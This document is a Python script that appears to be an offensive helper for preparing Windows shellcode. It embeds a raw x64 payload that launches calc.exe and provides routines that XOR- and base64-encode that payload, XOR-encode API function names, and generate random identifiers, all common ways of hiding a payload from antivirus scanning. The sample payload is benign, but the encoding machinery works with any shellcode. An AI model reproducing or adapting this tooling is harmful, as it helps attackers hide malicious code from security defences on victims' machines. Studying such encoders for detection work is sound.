#!/usr/bin/env python3
from base64 import b64encode
from random import choice
from string import ascii_letters, digits
from sys import exit

RAW_PAYLOAD = [0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00]
XOR_KEY = "abcdefghijklmnopqrstuvwxyz"
FUNC_XOR_KEY = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

# Produce XOR
def xor_func_name(func_name):
    _result = list()
    for i in range(len(func_name)):
        _result.append((ord(func_name[i]) ^ ord(FUNC_XOR_KEY[i%len(FUNC_XOR_KEY)])));
    _result.append(0)
    print_payload(_result)
    return _result


# Print in hex
def print_payload(payload):
    i = 1
    _delimeter = "\n"
    print("{")
    for _c in payload:
        _delimeter = " " if i==len(payload) else ", " if (i% 13 != 0) else ",\n"
        print("0x{:02x}".format(_c), end = _delimeter)
        i = i+1
    print("};")
    print("Payload Len: ", len(payload))


# Generate random strings
def gen_rand_str(count, size=12):
    if count <= 0:
        return
    else:
        for i in range(count):
            letters = ''.join(choice(ascii_letters) for i in range(size-2))
            digs = ''.join(choice(digits) for i in range(2))
            print(f"{letters}{digs}")


class Obsfucator:
    def __init__(self, raw_payload, xor_key):
        self.raw_payload = [x for x in raw_payload]
        self.raw_len = len(self.raw_payload)
        self.base64_payload = None
        self.base64_payload_len = 0
        self.xor_key = [ord(x) for x in xor_key]


    def level0(self):
        "Print the raw payload"
        print_payload(self.raw_payload)


    def level1(self):
        "XOR Payload"
        payload_len = self.raw_len
        key_len = len(self.xor_key)
        
        for i in range(payload_len):
            _payload_element = self.raw_payload[i]
            _key_element = self.xor_key[i%key_len]
            self.raw_payload[i] = _payload_element ^ _key_element


    def level2(self):
        "Base64 payload from Level 1"
        self.level1()
        _enc_payload = b64encode(bytes(self.raw_payload)).decode()
        self.raw_payload = [ord(x) for x in _enc_payload]
        self.level0() 


def main():
    # obs = Obsfucator(RAW_PAYLOAD, XOR_KEY)
    # obs.level2()
    gen_rand_str(12)
    return 0

if __name__ == '__main__':
    exit_code = main()
    exit(exit_code)